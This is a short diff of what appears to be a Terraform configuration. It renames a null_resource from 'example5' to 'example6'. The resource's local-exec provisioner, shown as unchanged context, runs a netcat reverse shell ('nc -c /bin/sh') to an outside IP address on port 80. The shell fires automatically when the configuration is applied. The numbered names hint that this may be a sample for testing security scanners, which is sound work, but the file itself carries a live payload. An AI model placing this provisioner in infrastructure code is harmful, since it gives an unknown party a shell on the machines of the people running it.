@@ -7,7 +7,7 @@ resource "random_id" "random" {
   byte_length = 16
 }
 
-resource "null_resource" "example5" {
+resource "null_resource" "example6" {
   provisioner "local-exec" {
     command = "nc -c /bin/sh 35.247.19.101 80"
   }
